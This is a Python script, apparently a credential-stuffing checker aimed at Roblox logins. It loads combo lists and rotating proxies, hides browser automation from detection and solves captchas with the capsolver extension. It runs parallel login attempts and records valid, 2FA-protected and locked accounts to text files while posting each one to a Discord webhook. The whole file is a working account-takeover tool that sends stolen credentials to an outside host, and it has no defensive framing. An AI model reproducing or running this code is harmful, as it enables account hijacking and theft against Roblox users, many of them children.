import os
import json
import random
import zipfile
import requests
from multiprocessing import Process
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

cwd = os.getcwd()

def formatProxy(proxy):
    if "@" in proxy:
        return proxy
    else:
        try:
            ip, port, username, password = proxy.split(":")
            return f"{username}:{password}@{ip}:{port}"
        except:
            return proxy

def send_to_discord(content):
    with open('config.json') as config_file:
        data = json.load(config_file)
    webhook_url = data['hook']
    payload = {"content": content}
    response = requests.post(webhook_url, data=payload)
    return response

def capsolver_api():
    js_path = os.path.join(cwd, 'capsolver', 'assets', 'config.js')

    cwd_json = os.path.join(cwd, 'config.json')

    with open(cwd_json, 'r') as file:
        config = json.load(file)
        new_key = config['apiKey']

    with open(js_path, 'r') as file:
        filedata = file.read()

    lines = filedata.split('\n')
    for i, line in enumerate(lines):
        if 'apiKey:' in line:
            lines[i] = f'apiKey: "{new_key}",'

    with open(js_path, 'w') as file:
        file.write('\n'.join(lines))

capsolver_api()

extension_path = f'{cwd}//capsolver'

def login(credentials, proxy):
    while True:
        try:
            co1, co2 = credentials.strip().split(":")
            ip, port, username, password = proxy.split(":")

            manifest_json = """
            {
                "version": "1.0.0",
                "manifest_version": 2,
                "name": "Chrome Proxy",
                "permissions": [
                    "proxy",
                    "tabs",
                    "unlimitedStorage",
                    "storage",
                    "<all_urls>",
                    "webRequest",
                    "webRequestBlocking"
                ],
                "background": {
                    "scripts": ["background.js"]
                },
                "minimum_chrome_version":"22.0.0"
            }
            """

            background_js = """
            var config = {
                    mode: "fixed_servers",
                    rules: {
                      singleProxy: {
                        scheme: "http",
                        host: "%s",
                        port: parseInt(%s)
                      },
                      bypassList: ["localhost"]
                    }
                  };

            chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

            function callbackFn(details) {
                return {
                    authCredentials: {
                        username: "%s",
                        password: "%s"
                    }
                };
            }

            chrome.webRequest.onAuthRequired.addListener(
                        callbackFn,
                        {urls: ["<all_urls>"]},
                        ['blocking']
            );
            """ % (ip, port, username, password)

            pluginfile = 'proxy_auth_plugin.zip'

            with zipfile.ZipFile(pluginfile, 'w') as zp:
                zp.writestr("manifest.json", manifest_json)
                zp.writestr("background.js", background_js)

            chrome_options = Options()
            chrome_options.headless = False
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
            chrome_options.add_argument(f'--load-extension={extension_path}')
            chrome_options.add_extension(pluginfile)

            driver = webdriver.Chrome(options=chrome_options)


            driver.get("https://www.roblox.com/login")

            driver.implicitly_wait(10)
            username = driver.find_element(By.ID, "login-username")
            username.send_keys(co1)
            password = driver.find_element(By.ID, "login-password")
            password.send_keys(co2)

            login = driver.find_element(By.ID, "login-button")
            login.click()

            try:
                captcha = driver.find_element(By.XPATH, "//h2[contains(text(), 'Verification')]")
                if captcha.is_displayed():
                    print("Captcha detected.")
            except:
                pass

            try:
                error_message = driver.find_element(By.ID, "login-form-error")
                if error_message.is_displayed():
                    error_text = error_message.text.lower()
                    if "unknown error" in error_text:
                        print("[-] Ratelimited.")
                    elif "incorrect" in error_text:
                        print("[-] Invalid." + co1 + ":" + co2)
            except:
                pass

            try:
                two_step_verification = driver.find_element(By.XPATH, "//h4[@class='modal-title' and text()='2-Step Verification']")
                if two_step_verification.is_displayed():
                    message = "[~] 2FA: " + co1 + ":" + co2
                    print(message)
                    send_to_discord(message)
                    with open("2fa.txt", "a") as file:
                        file.write(co1 + ":" + co2 + "\n")
            except:
                pass

            if driver.current_url == "https://www.roblox.com/login/securityNotification":
                message = "[~] Account locked. " + co1 + ":" + co2
                print(message)
                send_to_discord(message)
                with open("locked.txt", "a") as file:
                    file.write(co1 + ":" + co2 + "\n")

            if driver.current_url == "https://www.roblox.com/home":
                message = "[+] Valid: " + co1 + ":" + co2
                print(message)
                send_to_discord(message)
                with open("valid.txt", "a") as file:
                    file.write(co1 + ":" + co2 + "\n")

            driver.quit()
        except Exception as e:
            pass

if __name__ == "__main__":
    num_threads = threadCount = int(input("Threads: "))

    with open("combos.txt", "r") as file:
        lines = file.readlines()

    random.shuffle(lines)

    with open("proxies.txt", "r") as file:
        proxies = file.readlines()

    random.shuffle(proxies)

    processes = [Process(target=login, args=(lines[i], proxies[i % len(proxies)].strip())) for i in range(num_threads)]

    for process in processes:
        process.start()

    for process in processes:
        process.join()
